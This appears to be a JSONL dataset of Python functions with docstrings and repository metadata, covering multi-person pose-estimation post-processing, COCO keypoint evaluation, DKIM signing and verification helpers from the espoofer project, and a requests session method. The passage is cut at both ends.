joint_dst[1], num=num_intermed_pts))  # Same for the y coordinate\n                intermed_paf = paf_upsamp[limb_intermed_coords[0, :],\n                                          limb_intermed_coords[1, :], limb_intermed_coords[2:4, :]].T\n\n                score_intermed_pts = intermed_paf.dot(limb_dir)\n                score_penalizing_long_dist = score_intermed_pts.mean(\n                ) + min(0.5 * paf_upsamp.shape[0] / limb_dist - 1, 0)\n                # Criterion 1: At least 80% of the intermediate points have\n                # a score higher than thre2\n                criterion1 = (np.count_nonzero(\n                    score_intermed_pts > param['thre2']) > 0.8 * num_intermed_pts)\n                # Criterion 2: Mean score, penalized for large limb\n                # distances (larger than half the image height), is\n                # positive\n                criterion2 = (score_penalizing_long_dist > 0)\n                if criterion1 and criterion2:\n                    # Last value is the combined paf(+limb_dist) + heatmap\n                    # scores of both joints\n                    connection_candidates.append(\n                        [i, j, score_penalizing_long_dist, score_penalizing_long_dist + joint_src[2] + joint_dst[2]])\n\n        # Sort connection candidates based on their\n        # score_penalizing_long_dist\n        connection_candidates = sorted(\n            connection_candidates, key=lambda x: x[2], reverse=True)\n        connections = np.empty((0, 5))\n        # There can only be as many limbs as the smallest number of source\n        # or destination joints (eg: only 2 forearms if there's 5 wrists\n        # but 2 elbows)\n        max_connections = min(len(joints_src), len(joints_dst))\n        # Traverse all potential joint connections (sorted by their score)\n        for potential_connection in connection_candidates:\n            i, j, s = potential_connection[0:3]\n            # Make sure joints_src[i] or joints_dst[j] haven't already been\n            # connected to other joints_dst or joints_src\n            if i not in connections[:, 3] and j not in connections[:, 4]:\n                # [joint_src_id, joint_dst_id, limb_score_penalizing_long_dist, joint_src_index, joint_dst_index]\n                connections = np.vstack(\n                    [connections, [joints_src[i][3], joints_dst[j][3], s, i, j]])\n                # Exit if we've already established max_connections\n                # connections (each joint can't be connected to more than\n                # one joint)\n                if len(connections) >= max_connections:\n                    break\n        connected_limbs.append(connections)\n\nreturn connected_limbs", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/post.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Builds a vgg19 block from a dictionary\nArgs:\n    block: a dictionary\n\"\"\"\n", "func_signal": "def make_vgg19_block(block):\n", "code": "layers = []\nfor i in range(len(block)):\n    one_ = block[i]\n    for k, v in one_.items():\n        if 'pool' in k:\n            layers += [nn.MaxPool2d(kernel_size=v[0], stride=v[1],\n                                    padding=v[2])]\n        else:\n            conv2d = nn.Conv2d(in_channels=v[0], out_channels=v[1],\n                               kernel_size=v[2], stride=v[3],\n                               padding=v[4])\n            layers += [conv2d, nn.ReLU(inplace=True)]\nreturn nn.Sequential(*layers)", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/rtpose_vgg.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"\nAssociate limbs belonging to the same person together.\n:param connected_limbs: See 'return' doc of find_connected_joints()\n:param joint_list: unravel'd version of joint_list_per_joint [See 'return' doc of NMS()]\n:return: 2d np.array of size num_people x (NUM_JOINTS+2). For each person found:\n# First NUM_JOINTS columns contain the index (in joint_list) of the joints associated\nwith that person (or -1 if their i-th joint wasn't found)\n# 2nd-to-last column: Overall score of the joints+limbs that belong to this person\n# Last column: Total count of joints found for this person\n\"\"\"\n", "func_signal": "def group_limbs_of_same_person(connected_limbs, joint_list):\n", "code": "person_to_joint_assoc = []\n\nfor limb_type in range(NUM_LIMBS):\n    joint_src_type, joint_dst_type = joint_to_limb_heatmap_relationship[limb_type]\n\n    for limb_info in connected_limbs[limb_type]:\n        person_assoc_idx = []\n        for person, person_limbs in enumerate(person_to_joint_assoc):\n            if person_limbs[joint_src_type] == limb_info[0] or person_limbs[joint_dst_type] == limb_info[1]:\n                person_assoc_idx.append(person)\n\n        # If one of the joints has been associated to a person, and either\n        # the other joint is also associated with the same person or not\n        # associated to anyone yet:\n        if len(person_assoc_idx) == 1:\n            person_limbs = person_to_joint_assoc[person_assoc_idx[0]]\n            # If the other joint is not associated to anyone yet,\n            if person_limbs[joint_dst_type] != limb_info[1]:\n                # Associate it with the current person\n                person_limbs[joint_dst_type] = limb_info[1]\n                # Increase the number of limbs associated to this person\n                person_limbs[-1] += 1\n                # And update the total score (+= heatmap score of joint_dst\n                # + score of connecting joint_src with joint_dst)\n                person_limbs[-2] += joint_list[limb_info[1]\n                                               .astype(int), 2] + limb_info[2]\n        elif len(person_assoc_idx) == 2:  # if found 2 and disjoint, merge them\n            person1_limbs = person_to_joint_assoc[person_assoc_idx[0]]\n            person2_limbs = person_to_joint_assoc[person_assoc_idx[1]]\n            membership = ((person1_limbs >= 0) & (person2_limbs >= 0))[:-2]\n            if not membership.any():  # If both people have no same joints connected, merge them into a single person\n                # Update which joints are connected\n                person1_limbs[:-2] += (person2_limbs[:-2] + 1)\n                # Update the overall score and total count of joints\n                # connected by summing their counters\n                person1_limbs[-2:] += person2_limbs[-2:]\n                # Add the score of the current joint connection to the\n                # overall score\n                person1_limbs[-2] += limb_info[2]\n                person_to_joint_assoc.pop(person_assoc_idx[1])\n            else:  # Same case as len(person_assoc_idx)==1 above\n                person1_limbs[joint_dst_type] = limb_info[1]\n                person1_limbs[-1] += 1\n                person1_limbs[-2] += joint_list[limb_info[1]\n                                                .astype(int), 2] + limb_info[2]\n        else:  # No person has claimed any of these joints, create a new person\n            # Initialize person info to all -1 (no joint associations)\n            row = -1 * np.ones(20)\n            # Store the joint info of the new connection\n            row[joint_src_type] = limb_info[0]\n            row[joint_dst_type] = limb_info[1]\n            # Total count of connected joints for this person: 2\n            row[-1] = 2\n            # Compute overall score: score joint_src + score joint_dst + score connection\n            # {joint_src,joint_dst}\n            row[-2] = sum(joint_list[limb_info[:2].astype(int), 2]\n                          ) + limb_info[2]\n            person_to_joint_assoc.append(row)\n\n# Delete people who have very few parts connected\npeople_to_delete = []\nfor person_id, person_info in enumerate(person_to_joint_assoc):\n    if person_info[-1] < 3 or person_info[-2] / person_info[-1] < 0.2:\n        people_to_delete.append(person_id)\n# Traverse the list in reverse order so we delete indices starting from the\n# last one (otherwise, removing item for example 0 would modify the indices of\n# the remaining people to be deleted!)\nfor index in people_to_delete[::-1]:\n    person_to_joint_assoc.pop(index)\n\n# Appending items to a np.array can be very costly (allocating new memory, copying over the array, then adding new row)\n# Instead, we treat the set of people as a list (fast to append items) and\n# only convert to np.array at the end\nreturn np.array(person_to_joint_assoc)", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/post.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "# Bottom-up approach:\n# Step 1: find all joints in the image (organized by joint type: [0]=nose,\n# [1]=neck...)\n", "func_signal": "def decode_pose(img_orig, param, heatmaps, pafs):\n", "code": "joint_list_per_joint_type = NMS(param,\n                                heatmaps, img_orig.shape[0] / float(heatmaps.shape[0]))\n# joint_list is an unravel'd version of joint_list_per_joint, where we add\n# a 5th column to indicate the joint_type (0=nose, 1=neck...)\njoint_list = np.array([tuple(peak) + (joint_type,) for joint_type,\n                       joint_peaks in enumerate(joint_list_per_joint_type) for peak in joint_peaks])\n\n# Step 2: find which joints go together to form limbs (which wrists go\n# with which elbows)\npaf_upsamp = cv2.resize(\n    pafs, (img_orig.shape[1], img_orig.shape[0]), interpolation=cv2.INTER_CUBIC)\nconnected_limbs = find_connected_joints(param,\n                                        paf_upsamp, joint_list_per_joint_type)\n\n# Step 3: associate limbs that belong to the same person\nperson_to_joint_assoc = group_limbs_of_same_person(\n    connected_limbs, joint_list)\n\n# (Step 4): plot results\nto_plot, canvas = plot_pose(img_orig, joint_list, person_to_joint_assoc)\n\nreturn to_plot, canvas, joint_list, person_to_joint_assoc", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/post.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Evaluate images on Coco test set\n:param outputs: list of dictionaries, the models' processed outputs\n:param dataDir: string, path to the MSCOCO data directory\n:param imgIds: list, all the image ids in the validation set\n:returns : float, the mAP score\n\"\"\"\n", "func_signal": "def eval_coco(outputs, annFile, imgIds):\n", "code": "with open('results.json', 'w') as f:\n    json.dump(outputs, f)  \ncocoGt = COCO(annFile)  # load annotations\ncocoDt = cocoGt.loadRes('results.json')  # load model outputs\n\n# running evaluation\ncocoEval = COCOeval(cocoGt, cocoDt, 'keypoints')\ncocoEval.params.imgIds = imgIds\ncocoEval.evaluate()\ncocoEval.accumulate()\ncocoEval.summarize()\nos.remove('results.json')\n# return Average Precision\nreturn cocoEval.stats[0]", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/evaluate/coco_eval.py", "commit_date": "2019-09-12 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Mask area.\n\nIntensities is either a feature map or an image.\n\"\"\"\n", "func_signal": "def mask_valid_area(intensities, valid_area):\n", "code": "if valid_area is None:\n    return\n\nif valid_area[1] >= 1.0:\n    intensities[:, :int(valid_area[1]), :] = 0\nif valid_area[0] >= 1.0:\n    intensities[:, :, :int(valid_area[0])] = 0\n\nmax_i = int(math.ceil(valid_area[1] + valid_area[3]))\nmax_j = int(math.ceil(valid_area[0] + valid_area[2]))\nif max_i < intensities.shape[1]:\n    intensities[:, max_i:, :] = 0\nif max_j < intensities.shape[2]:\n    intensities[:, :, max_j:] = 0", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/datasets/utils.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "# Remove all trailing WSP at end of lines.\n# Compress non-line-ending WSP to single space.\n# Ignore all empty lines at the end of the message body.\n", "func_signal": "def canonicalize_body(body):\n", "code": "return correct_empty_body(strip_trailing_lines(\n    compress_whitespace(strip_trailing_whitespace(body))))", "path": "espoofer/dkim/canonicalization.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Normalize bytes/str to str for python 2/3 compatible doctests.\n>>> text(b'foo')\n'foo'\n>>> text(u'foo')\n'foo'\n>>> text('foo')\n'foo'\n\"\"\"\n", "func_signal": "def text(s):\n", "code": "if type(s) is str: return s\ns = s.decode('ascii')\nif type(s) is str: return s\nreturn s.encode('ascii')", "path": "espoofer/dkim/__init__.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\" Add headers not in should_not_sign to frozen_sign.\n@param s: list of headers to add to frozen_sign\n@since: 0.9\n\n>>> dkim = DKIM()\n>>> dkim.add_should_not(DKIM.RFC5322_SINGLETON)\n>>> [text(x) for x in sorted(dkim.should_not_sign)]\n['bcc', 'cc', 'comments', 'date', 'dkim-signature', 'in-reply-to', 'keywords', 'message-id', 'received', 'references', 'reply-to', 'resent-bcc', 'return-path', 'sender', 'to']\n\"\"\"\n", "func_signal": "def add_should_not(self,s):\n", "code": "self.should_not_sign.update(x.lower() for x in s\n    if x.lower() not in self.frozen_sign)", "path": "espoofer/dkim/__init__.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Return the default list of headers to sign: those in should_sign or\nfrozen_sign, with those in frozen_sign signed an extra time to prevent\nadditions.\n@since: 0.5\"\"\"\n", "func_signal": "def default_sign_headers(self):\n", "code": "hset = self.should_sign | self.frozen_sign\ninclude_headers = [ x for x,y in self.headers\n    if x.lower() in hset ]\nreturn include_headers + [ x for x in include_headers\n    if x.lower() in self.frozen_sign]", "path": "espoofer/dkim/__init__.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\" Add headers not in should_not_sign to frozen_sign.\n@param s: list of headers to add to frozen_sign\n@since: 0.5\n\n>>> dkim = DKIM()\n>>> dkim.add_frozen(DKIM.RFC5322_SINGLETON)\n>>> [text(x) for x in sorted(dkim.frozen_sign)]\n['cc', 'date', 'from', 'in-reply-to', 'message-id', 'references', 'reply-to', 'sender', 'to']\n>>> dkim2 = DKIM()\n>>> dkim2.add_frozen((b'date',b'subject'))\n>>> [text(x) for x in sorted(dkim2.frozen_sign)]\n['date', 'from', 'subject']\n\"\"\"\n", "func_signal": "def add_frozen(self,s):\n", "code": "self.frozen_sign.update(x.lower() for x in s\n    if x.lower() not in self.should_not_sign)", "path": "espoofer/dkim/__init__.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Verify the first (topmost) DKIM signature on an RFC822 formatted message.\n@param message: an RFC822 formatted message (with either \\\\n or \\\\r\\\\n line endings)\n@param logger: a logger to which debug info will be written (default None)\n@return: True if signature verifies or False otherwise\n\"\"\"\n# type: (bytes, any, function, int) -> bool\n", "func_signal": "def verify(message, logger=None, dnsfunc=get_txt, minkey=1024):\n", "code": "d = DKIM(message,logger=logger,minkey=minkey)\ntry:\n    return d.verify(dnsfunc=dnsfunc)\nexcept DKIMException as x:\n    if logger is not None:\n        logger.error(\"%s\" % x)\n    return False", "path": "espoofer/dkim/__init__.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "# Backward compatibility hack because argparse doesn't support optional\n# positional arguments\n", "func_signal": "def main():\n", "code": "arguments=['--'+arg if arg[:8] == 'identity' else arg for arg in sys.argv[1:]]\nparser = argparse.ArgumentParser(\n    description='Produce DKIM signature for email messages.',\n    epilog=\"message to be signed follows commands on stdin\")\nparser.add_argument('selector', action=\"store\")\nparser.add_argument('domain', action=\"store\")\nparser.add_argument('privatekeyfile', action=\"store\")\nparser.add_argument('--hcanon', choices=['simple', 'relaxed'],\n    default='relaxed',\n    help='Header canonicalization algorithm: default=relaxed')\nparser.add_argument('--bcanon', choices=['simple', 'relaxed'],\n    default='simple',\n    help='Body canonicalization algorithm: default=simple')\nparser.add_argument('--signalg', choices=['rsa-sha256', 'ed25519-sha256', 'rsa-sha1'],\n    default='rsa-sha256',\n    help='Signature algorithm: default=rsa-sha256')\nparser.add_argument('--identity', help='Optional value for i= tag.')\nargs=parser.parse_args(arguments)\ninclude_headers = None\nlength = None\nlogger = None\n\nif sys.version_info[0] >= 3:\n    args.selector = bytes(args.selector, encoding='UTF-8')\n    args.domain = bytes(args.domain, encoding='UTF-8')\n    if args.identity is not None:\n        args.identity = bytes(args.identity, encoding='UTF-8')\n    args.hcanon = bytes(args.hcanon, encoding='UTF-8')\n    args.bcanon = bytes(args.bcanon, encoding='UTF-8')\n    args.signalg = bytes(args.signalg, encoding='UTF-8')\n    # Make sys.stdin and stdout binary streams.\n    sys.stdin = sys.stdin.detach()\n    sys.stdout = sys.stdout.detach()\ncanonicalize = (args.hcanon, args.bcanon)\n\nmessage = sys.stdin.read()\ntry:\n    d = dkim.DKIM(message,logger=logger, signature_algorithm=args.signalg,\n                  linesep=dkim.util.get_linesep(message))\n    sig = d.sign(args.selector, args.domain, open(\n                 args.privatekeyfile, \"rb\").read(), identity = args.identity,\n                 canonicalize=canonicalize, include_headers=include_headers,\n                 length=length)\n    sys.stdout.write(sig)\n    sys.stdout.write(message)\nexcept Exception as e:\n    print(e, file=sys.stderr)\n    sys.stdout.write(message)", "path": "espoofer/dkim/dkimsign.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Validate DKIM or ARC Signature fields.\nBasic checks for presence and correct formatting of mandatory fields.\nRaises a ValidationError if checks fail, otherwise returns None.\n@param sig: A dict mapping field keys to values.\n@param mandatory_fields: A list of non-optional fields\n@param arc: flag to differentiate between dkim & arc\n\"\"\"\n", "func_signal": "def validate_signature_fields(sig, mandatory_fields=[b'v', b'a', b'b', b'bh', b'd', b'h', b's'], arc=False):\n", "code": "if arc:\n    hashes = ARC_HASH_ALGORITHMS\nelse:\n    hashes = HASH_ALGORITHMS\nfor field in mandatory_fields:\n    if field not in sig:\n        raise ValidationError(\"missing %s=\" % field)\n\nif b'a' in sig and not sig[b'a'] in hashes:\n    raise ValidationError(\"unknown signature algorithm: %s\" % sig[b'a'])\n\nif b'b' in sig:\n    if re.match(br\"[\\s0-9A-Za-z+/]+=*$\", sig[b'b']) is None:\n        raise ValidationError(\"b= value is not valid base64 (%s)\" % sig[b'b'])\n    if len(re.sub(br\"\\s+\", b\"\", sig[b'b'])) % 4 != 0:\n        raise ValidationError(\"b= value is not valid base64 (%s)\" % sig[b'b'])\n\nif b'bh' in sig:\n    if re.match(br\"[\\s0-9A-Za-z+/]+=*$\", sig[b'bh']) is None:\n        raise ValidationError(\"bh= value is not valid base64 (%s)\" % sig[b'bh'])\n    if len(re.sub(br\"\\s+\", b\"\", sig[b'bh'])) % 4 != 0:\n        raise ValidationError(\"bh= value is not valid base64 (%s)\" % sig[b'bh'])\n\nif b'cv' in sig and sig[b'cv'] not in (CV_Pass, CV_Fail, CV_None):\n    raise ValidationError(\"cv= value is not valid (%s)\" % sig[b'cv'])\n\n# Nasty hack to support both str and bytes... check for both the\n# character and integer values.\nif not arc and b'i' in sig and (\n    not sig[b'i'].lower().endswith(sig[b'd'].lower()) or\n    sig[b'i'][-len(sig[b'd'])-1] not in ('@', '.', 64, 46)):\n    raise ValidationError(\n        \"i= domain is not a subdomain of d= (i=%s d=%s)\" %\n        (sig[b'i'], sig[b'd']))\nif b'l' in sig and re.match(br\"\\d{,76}$\", sig[b'l']) is None:\n    raise ValidationError(\n        \"l= value is not a decimal integer (%s)\" % sig[b'l'])\nif b'q' in sig and sig[b'q'] != b\"dns/txt\":\n    raise ValidationError(\"q= value is not dns/txt (%s)\" % sig[b'q'])\n\nif b't' in sig:\n    if re.match(br\"\\d+$\", sig[b't']) is None:\n        raise ValidationError(\n            \"t= value is not a decimal integer (%s)\" % sig[b't'])\n    now = int(time.time())\n    slop = 36000 # 10H leeway for mailers with inaccurate clocks\n    t_sign = int(sig[b't'])\n    if t_sign > now + slop:\n        raise ValidationError(\"t= value is in the future (%s)\" % sig[b't'])\n\nif b'v' in sig and sig[b'v'] != b\"1\":\n    raise ValidationError(\"v= value is not 1 (%s)\" % sig[b'v'])\n\nif b'x' in sig:\n    if re.match(br\"\\d+$\", sig[b'x']) is None:\n        raise ValidationError(\n          \"x= value is not a decimal integer (%s)\" % sig[b'x'])\n    x_sign = int(sig[b'x'])\n    now = int(time.time())\n    slop = 36000 # 10H leeway for mailers with inaccurate clocks\n    if x_sign < now - slop:\n        raise ValidationError(\n            \"x= value is past (%s)\" % sig[b'x'])\n        if x_sign < t_sign:\n            raise ValidationError(\n                \"x= value is less than t= value (x=%s t=%s)\" %\n                (sig[b'x'], sig[b't']))", "path": "espoofer/dkim/__init__.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Return a TXT record associated with a DNS name.\"\"\"\n# Older pydns releases don't like a trailing dot.\n", "func_signal": "def get_txt_pydns(name):\n", "code": "if name.endswith('.'):\n    name = name[:-1]\nresponse = DNS.DnsRequest(name, qtype='txt').req()\nif not response.answers:\n    return None\nreturn b''.join(response.answers[0]['data'])", "path": "espoofer/dkim/dnsplug.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\" Given a key, extract the bit we should place in DNS.\n\"\"\"\n", "func_signal": "def ExtractRSADnsPublicKey(private_key_file, dns_file):\n", "code": "eprint('extracting ' + private_key_file)\nworking_file = tempfile.NamedTemporaryFile(delete=False).name\nsubprocess.check_call([OPENSSL_BINARY, 'rsa', '-in', private_key_file,\n                       '-out', working_file, '-pubout', '-outform', 'PEM'])\ntry:\n    with open(working_file) as wf:\n        y = ''\n        for line in wf.readlines():\n            if not line.startswith('---'):\n                y+= line\n        output = ''.join(y.split())\nfinally:\n    os.unlink(working_file)\nwith open(dns_file, 'w') as dns_fp:\n    eprint('writing ' + dns_file)\n    dns_fp.write(\"v=DKIM1; k=rsa; h=sha256; p={0}\".format(output))", "path": "espoofer/dkim/dknewkey.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Parse a message in RFC822 format.\n\n@param message: The message in RFC822 format. Either CRLF or LF is an accepted line separator.\n@return: Returns a tuple of (headers, body) where headers is a list of (name, value) pairs.\nThe body is a CRLF-separated string.\n\"\"\"\n", "func_signal": "def rfc822_parse(message):\n", "code": "headers = []\nlines = re.split(b\"\\r?\\n\", message)\ni = 0\nwhile i < len(lines):\n    if len(lines[i]) == 0:\n        # End of headers, return what we have plus the body, excluding the blank line.\n        i += 1\n        break\n    if lines[i][0] in (\"\\x09\", \"\\x20\", 0x09, 0x20):\n        headers[-1][1] += lines[i]+b\"\\r\\n\"\n    else:\n        m = re.match(br\"([\\x21-\\x7e]+?):\", lines[i])\n        if m is not None:\n            headers.append([m.group(1), lines[i][m.end(0):]+b\"\\r\\n\"])\n        elif lines[i].startswith(b\"From \"):\n            pass\n        else:\n            raise MessageFormatError(\"Unexpected characters in RFC822 header: %s\" % lines[i])\n    i += 1\nreturn (headers, b\"\\r\\n\".join(lines[i:]))", "path": "espoofer/dkim/__init__.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Return a TXT record associated with a DNS name.\"\"\"\n# Older pydns releases don't like a trailing dot.\n", "func_signal": "def get_txt_Milter_dns(name):\n", "code": "if name.endswith('.'):\n    name = name[:-1]\nsess = Session()\na = sess.dns(name.encode('idna'),'TXT')\nif a: return b''.join(a[0])\nreturn None", "path": "espoofer/dkim/dnsplug.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "# Convert all header field names to lowercase.\n# Unfold all header lines.\n# Compress WSP to single space.\n# Remove all WSP at the start or end of the field value (strip).\n", "func_signal": "def canonicalize_headers(headers):\n", "code": "return [\n    (x[0].lower().rstrip(),\n     compress_whitespace(unfold_header_value(x[1])).strip() + b\"\\r\\n\")\n    for x in headers]", "path": "espoofer/dkim/canonicalization.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\" Given a ed25519 key, extract the bit we should place in DNS.\n\"\"\"\n", "func_signal": "def ExtractEd25519PublicKey(dns_file, priv_key):\n", "code": "import nacl.encoding # Yes, pep-8, but let's not make everyone install nacl\npubkey = priv_key.verify_key\noutput = pubkey.encode(encoder=nacl.encoding.Base64Encoder).decode(\"utf-8\")\nwith open(dns_file, 'w') as dns_fp:\n    eprint('writing ' + dns_file)\n    dns_fp.write(\"v=DKIM1; k=ed25519; p={0}\".format(output))", "path": "espoofer/dkim/dknewkey.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\" Generates a suitable private key.  Output is unprotected.\nYou should encrypt your keys.\n\"\"\"\n", "func_signal": "def GenRSAKeys(private_key_file):\n", "code": "eprint('generating ' + private_key_file)\nsubprocess.check_call([OPENSSL_BINARY, 'genrsa', '-out', private_key_file,\n                       str(BITS_REQUIRED)])", "path": "espoofer/dkim/dknewkey.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Fold a header line into multiple crlf-separated lines of text at column\n 72.  The crlf does not count for line length.\n\n>>> text(fold(b'foo'))\n'foo'\n>>> text(fold(b'foo  '+b'foo'*24).splitlines()[0])\n'foo '\n>>> text(fold(b'foo'*25).splitlines()[-1])\n' foo'\n>>> len(fold(b'foo'*25).splitlines()[0])\n72\n>>> text(fold(b'x'))\n'x'\n>>> text(fold(b'xyz'*24))\n'xyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyzxyz'\n>>> len(fold(b'xyz'*48))\n150\n\"\"\"\n# 72 is the max line length we actually want, but the header field name\n# has to fit in the first line too (See Debian Bug #863690).\n", "func_signal": "def fold(header, namelen=0, linesep=b'\\r\\n'):\n", "code": "maxleng = 72 - namelen\nif len(header) <= maxleng:\n    return header\nif len(header) - header.rfind(b\"\\r\\n\") == 2 and len(header) <= maxleng +2:\n    return header\ni = header.rfind(b\"\\r\\n \")\nif i == -1:\n    pre = b\"\"\nelse:\n    i += 3\n    pre = header[:i]\n    header = header[i:]\nwhile len(header) > maxleng:\n    i = header[:maxleng].rfind(b\" \")\n    if i == -1:\n        j = maxleng\n        pre += header[:j] + linesep + b\" \"\n    else:\n        j = i + 1\n        pre += header[:i] + linesep + b\" \"\n    header = header[j:]\n    maxleng = 71\nif len(header) > 2:\n    return pre + header\nelse:\n    if pre[0] == b' ':\n        return pre[:-1]\n    else:\n        return pre + header", "path": "espoofer/dkim/__init__.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Get the default dkimpy logger.\"\"\"\n", "func_signal": "def get_default_logger():\n", "code": "logger = logging.getLogger('dkimpy')\nif not logger.handlers:\n    logger.addHandler(NullHandler())\nreturn logger", "path": "espoofer/dkim/util.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Return a TXT record associated with a DNS name.\n\n@param name: The bytestring domain name to look up.\n\"\"\"\n# pydns needs Unicode, but DKIM's d= is ASCII (already punycoded).\n", "func_signal": "def get_txt(name):\n", "code": "try:\n    unicode_name = name.decode('UTF-8')\nexcept UnicodeDecodeError:\n    return None\ntxt = _get_txt(unicode_name)\nif type(txt) is str:\n  txt = txt.encode('utf-8')\nreturn txt", "path": "espoofer/dkim/dnsplug.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Construct the canonicalization policy described by a c= value.\n\nMay raise an C{InvalidCanonicalizationPolicyError} if the given\nvalue is invalid\n\n@param c: c= value from a DKIM-Signature header field\n@return: a C{CanonicalizationPolicy}\n\"\"\"\n", "func_signal": "def from_c_value(cls, c):\n", "code": "if c is None:\n    c = b'simple/simple'\nm = c.split(b'/')\nif len(m) not in (1, 2):\n    raise InvalidCanonicalizationPolicyError(c)\nif len(m) == 1:\n    m.append(b'simple')\ncan_headers, can_body = m\ntry:\n    header_algorithm = ALGORITHMS[can_headers]\n    body_algorithm = ALGORITHMS[can_body]\nexcept KeyError as e:\n    raise InvalidCanonicalizationPolicyError(e.args[0])\nreturn cls(header_algorithm, body_algorithm)", "path": "espoofer/dkim/canonicalization.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Generates a base64 encoded private key for ed25519 DKIM signing.\nOutput is unprotected.  You should protect your keys.\n\"\"\"\n", "func_signal": "def GenEd25519Keys(private_key_file):\n", "code": "import nacl.signing # Yes, pep-8, but let's not make everyone install nacl\nimport nacl.encoding\nimport os\nskg = nacl.signing.SigningKey(seed=os.urandom(32))\neprint('generating ' + private_key_file)\npriv_key = skg.generate()\nwith open(private_key_file, 'w') as pkf:\n    pkf.write(priv_key.encode(encoder=nacl.encoding.Base64Encoder).decode(\"utf-8\"))\nreturn(priv_key)", "path": "espoofer/dkim/dknewkey.py", "commit_date": "2019-10-17 00:00:00", "repo_name": "chenjj/espoofer", "stars": 1284, "license": "mit", "language": "python", "size": 4075}
{"docstring": "\"\"\"Check the environment and merge it with some settings.\"\"\"\n# Gather clues from the surrounding environment.\n", "func_signal": "def merge_environment_settings(self, url, proxies, stream, verify, cert):\n", "code": "if self.trust_env:\n    # Set environment's proxies.\n    env_proxies = get_environ_proxies(url) or {}\n    for (k, v) in env_proxies.items():\n        proxies.setdefault(k, v)\n\n    # Look for requests environment configuration and be compatible\n    # with cURL.\n    if verify is True or verify is None:\n        verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                  os.environ.get('CURL_CA_BUNDLE'))\n\n# Merge all the kwargs.\nproxies = merge_setting(proxies, self.proxies)\nstream = merge_setting(stream, self.stream)\nverify = merge_setting(verify, self.verify)\ncert = merge_setting(cert, self.cert)\n\nreturn {'verify': verify, 'proxies': proxies, 'stream': stream,\n        'cert': cert}", "path": "weakfilescan/libs/requests/sessions.py", "commit_date": "2015-04-02 00:00:00", "repo_name": "ring04h/weakfilescan", 